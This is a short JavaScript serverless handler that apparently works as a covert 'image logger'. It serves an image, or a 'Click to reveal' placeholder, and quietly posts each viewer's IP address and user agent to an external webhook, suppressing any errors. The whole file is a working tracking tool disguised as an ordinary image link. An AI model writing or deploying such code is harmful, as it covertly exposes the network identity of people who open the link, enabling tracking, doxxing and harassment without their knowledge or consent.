module.exports = async function handler(req, res) {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';
  const referer = req.headers['referer'] || 'Direct';
  
  if (process.env.WEBHOOK_URL) {
    try {
      await fetch(process.env.WEBHOOK_URL, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({content: `🖼️ Image View: ${ip}\n${userAgent}`})
      });
    } catch (e) {}
  }
  
  const fs = require('fs');
  const path = require('path');
  const imagePath = path.join(process.cwd(), 'public', 'image.png');
  
  if (fs.existsSync(imagePath)) {
    res.setHeader('Content-Type', 'image/png');
    res.send(fs.readFileSync(imagePath));
  } else {
    res.setHeader('Content-Type', 'image/svg+xml');
    res.send(`<svg xmlns="http://www.w3.org/2000/svg" width="400" height="300"><rect fill="#4a90d9" width="400" height="300"/><text x="200" y="150" text-anchor="middle" fill="white" font-size="24">Click to reveal</text></svg>`);
  }
};